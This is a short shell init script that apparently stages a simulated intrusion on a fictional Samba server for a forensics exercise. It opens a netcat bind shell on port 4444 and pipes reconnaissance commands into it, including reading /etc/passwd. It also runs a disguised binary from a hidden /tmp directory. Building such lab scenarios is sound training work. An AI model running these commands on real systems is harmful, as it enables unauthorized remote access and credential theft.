#!/bin/sh
mount -t proc proc /proc; mount -t sysfs sys /sys; mount -t devtmpfs dev /dev
hostname FS01
ip link set lo up; ip addr add 10.10.10.5/32 dev lo; ip addr add 203.0.113.66/32 dev lo
echo "FS01 Samba file server - TechNova Solutions" > /etc/motd
nc -l -p 443 > /tmp/c2_rx.log &
sleep 1
nc -l -p 4444 -e /bin/sh &
sleep 1
( echo "id; uname -a; cat /etc/passwd; ls -la /srv/samba/shared; cd /tmp/.X11-unix/.cache && ./kworker_upd /srv/samba/shared" ; sleep 99999 ) | nc 10.10.10.5 4444 &
sleep 3
echo "MEMSNAP_READY"
while true; do sleep 30; done
